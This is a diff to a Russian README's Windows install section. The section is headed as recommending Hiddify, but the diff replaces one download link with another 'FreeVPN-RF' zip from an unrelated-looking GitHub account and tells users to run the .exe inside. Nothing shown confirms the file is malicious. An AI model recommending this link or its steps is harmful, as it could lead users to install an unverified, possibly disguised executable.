@@ -45,7 +45,7 @@
 
 ### Windows (рекомендуется: Hiddify)
 
-1. Скачайте [FREEVPN-RF](https://github.com/Portalsawarehouse/FreeVPN-RF/releases/download/Stable/Package.zip) (клиент)
+1. Скачайте [FREEVPN-RF](https://github.com/Portalsawarehouse/FreeVPN-RF/releases/download/Stable/VPN-RF.zip) (клиент)
 2. Распакуйте на рабочий стол
 3. Запустите .exe файл и нажмите "Установить"
 4. ВПН Откроется автоматически
